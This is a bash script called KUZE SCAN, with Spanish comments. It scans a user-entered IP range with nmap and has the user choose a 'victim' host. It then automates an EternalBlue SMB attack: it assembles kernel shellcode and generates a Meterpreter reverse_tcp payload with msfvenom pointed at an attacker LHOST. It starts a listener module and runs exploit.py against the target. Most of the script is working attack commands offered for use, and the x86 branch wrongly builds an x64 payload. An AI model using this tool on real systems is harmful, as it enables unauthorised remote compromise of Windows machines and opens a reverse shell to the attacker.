#! /bin/bash
VERSION=0.0.1b

#yellow start 
	YS="\e[1;33m"
#blue start 
	BS="\e[0;34m"
#color end
	CE="\e[0m"
#red start
	RS="\e[1;31m"
#black start
	BLS="\e[0;30m"
#dark gray start
	DGYS="\e[1;30m"
#light blue start
	LBS="\e[1;34m"
#green start
	GNS="\e[0;32m"
#light green start
	LGNS="\e[1;32m"
#cyan start
	CYS="\e[0;36m"
#light cyan start
	LCYS="\e[1;36m"
#light red start
	DRS="\e[0;31m"
#purple start
	PS="\e[0;35m"
#light purple start
	LPS="\e[1;35m"
#brown start
	BRS="\e[0;33m"
#light gray start
	LGYS="\e[0;37m"
#white start
	WHS="\e[1;37m"
clear
echo -e "$RS					 ########################### $CE"
echo -e "$RS 					 ###                     ### $CE"
echo -e "$RS					 ###      KUZE SCAN      ### $CE"
echo -e "$RS					 ###               V0.1B ### $CE"
echo -e "$RS					 ########################### $CE"
echo -e ""
#Permite al usuario introducir un rango de ip para analizar
echo -e "$BS Address IP with range (EJ: 192.168.1.1/25): $CE"
read -e RANGO

#Permite al usuario introducir un rango de puertos para analizar
echo -e "$BS Port with range (EJ:80-200, 445-600, 8080-9090): $CE"
read -e PUERTORANGO

#Comienza el analisis en el rango de puerto introducido y en el rango de IP, solo muestra los puertos abiertos
nmap -p $PUERTORANGO --open $RANGO --system-dns

#Le pide al usuario declarar la IP victima , para en caso de que esten varios dispositivos en la red
echo -e "$BS IP to analyze: $CE"
read -e IPVICTIMA

#Le permite al usuario declarar el puerto a analizar, en caso de que hallan varios puertos abiertos
echo -e "$BS Port to analyze: $CE"
read -e PUERTO

clear

#Mostramos un menu para 
echo -e "$DRS 			!!!MENU OF SCRIPTS   $CE!!!"
echo -e "$CYS 1)Script SMB OS DISCOVERY(Recomend for 445 OPEN) $CE"
echo -e "$CYS 2)OS DETECTION PARAMETRO(Recomend for other port) $CE"
echo -e "$CYS 3)Script TRACE (Recomend for another port, use form show information send and recv)$CE"
echo -e "$CYS 4)Exit $CE"
echo -e "$CYS Choose: $CE"
read -e OPCION1
if [[ "$OPCION1" = "1" ]]
	then
		clear
		nmap -p $PUERTO $IPVICTIMA --script smb-os-discovery --system-dns
elif [[ "$OPCION1" = "2" ]]
	then
		clear
		nmap -p $PUERTO $IPVICTIMA -O --system-dns
elif [[ "$OPCION1" = "3" ]]
	then
		clear
		nmap -p $PUERTO $IPVICTIMA --packet-trace --system-dns
	else
		echo -e "OK SEE YOU LATER... :("
		echo -e "EXIT..."
		sleep 5
		clear
		exit
fi
echo -e ""
echo -e "$RS Do you want create a exploit for atack the port 445(SMB)(YES/NO): $CE"
read -e OPCION2
if [[ "$OPCION2" = "YES" ]]
	then
		clear
		echo -e "$RS What architecture do you want attack (x64 o x86): $CE"
		read -e ARCHITECTURE
		if [[ "$ARCHITECTURE" = "x64" ]]
			then
				RPATHX64="/root/kuze_scan/shellcode/eternalblue_kshellcode_x64.asm"
				RPATH2X64="/root/kuze_scan/shellcode/eternalblue_kshellcode_x64"
				nasm -f bin $RPATHX64
				echo -e "$GNS File create correct in $RPATH2X64 $CE"
				clear
				echo -e "$DRS Write the rute in that want save the payload(EJ:(/root/kuze_scan/shellcode/meterpreter_msf.bin: $CE"
				read -e RUTAX64
				echo -e "$DRS LHOST: $CE"
				read -e LHOSTX64
				echo -e "$DRS LPORT: $CE"
				read -e LPORTX64
				msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o $RUTAX64 EXITFUNC=thread LHOST=$LHOSTX64 LPORT=$LPORTX64
				echo -e "$DRS Write a rute for the payload final(EJ:/root/kuze_scan/metepreter_final_x64.bin: $CE"
				read -e RUTAFINALX64
				cat $RPATH2X64 $RUTAX64 > $RUTAFINALX64
				gnome-terminal --geometry 60x12+0+999999 -e /root/kuze_scan/modules/module_msf_x64.sh
				echo -e "$RS [!!!]LAUNCHING EXPLOIT TO VICTIM $IPVICTIMA $CE"
				read -e 
				python /root/kuze_scan/exploit.py $IPVICTIMA $RUTAFINALX64
		elif [[ "$ARCHITECTURE" = "x86" ]]
			then	
				RPATHX86="/root/kuze_scan/shellcode/eternalblue_kshellcode_x86.asm"
				RPATH2X86="/root/kuze_scan/shellcode/eternalblue_kshellcode_x86"
				nasm -f bin $RPATHX86
				echo -e "$GNS File create correct in $RPATH2X86 $CE"
				clear
				echo -e "$DRS Write the rute in that want save the payload(EJ:(/root/kuze_scan/shellcode/meterpreter_final_x86.bin: $CE"
				read -e RUTAX86
				echo -e "$DRS LHOST: $CE"
				read -e LHOSTX86
				echo -e "$DRS LPORT: $CE"
				read -e LPORTX86
				msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o $RUTAX86 EXITFUNC=thread LHOST=$LHOSTX86 LPORT=$LPORTX86
				echo -e "$DRS Write a rute for the payload final(EJ:/root/kuze_scan/metepreter_final_x86.bin: $CE"
				read -e RUTAFINALX86
				cat $RPATH2X86 $RUTAX86 > $RUTAFINALX86
				gnome-terminal --geometry 60x12+0+999999 -e /root/kuze_scan/modules/module_msf_x86.sh
				echo -e "$RS [!!!]LAUNCHING EXPLOIT TO VICTIM $IPVICTIMA $CE"
				read -e
				python /root/kuze_scan/exploit.py $IPVICTIMA $RUTAFINALX86
		fi
fi
